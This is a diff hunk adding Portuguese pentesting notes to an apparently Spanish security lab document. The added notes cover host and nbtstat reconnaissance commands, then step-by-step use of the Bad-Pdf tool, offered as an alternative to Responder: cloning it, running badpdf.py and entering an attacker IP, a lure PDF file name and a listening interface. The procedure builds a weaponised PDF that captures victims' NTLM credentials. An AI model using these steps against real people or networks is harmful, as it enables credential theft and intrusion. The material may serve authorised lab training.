@@ -1940,3 +1940,30 @@ Ahora, para poder localizar la maquina Parrot, se selecciona Capture default deb
 
 
 De manera similar se pueden ir explorando todas las pestanas de la herramienta, por ejemplo la pestana "Packets" para ver los paquetes que fueron transferidos por la IP de la Parrot.
+
+
+host endereço_ip
+nbtstat -A endereço_ip (saber nome maquina)
+
+alternatica ao responder 
+
+git clone https://github.com/deepzec/Bad-Pdf
+
+cd Bad-Pdf/
+
+ls -l
+
+02 - Passo
+Execute o script badpdf.py e informe os dados tais como: IP do Atacante, Nome do Arquivo (PDF), Interface de Rede.
+
+ Linux
+python badpdf.py
+
+Please enter Bad-PDF host IP:
+192.168.0.100
+
+Please enter output file name:
+100security.pdf
+
+Please enter the inteface name to listen(Default eth0):
+eth0
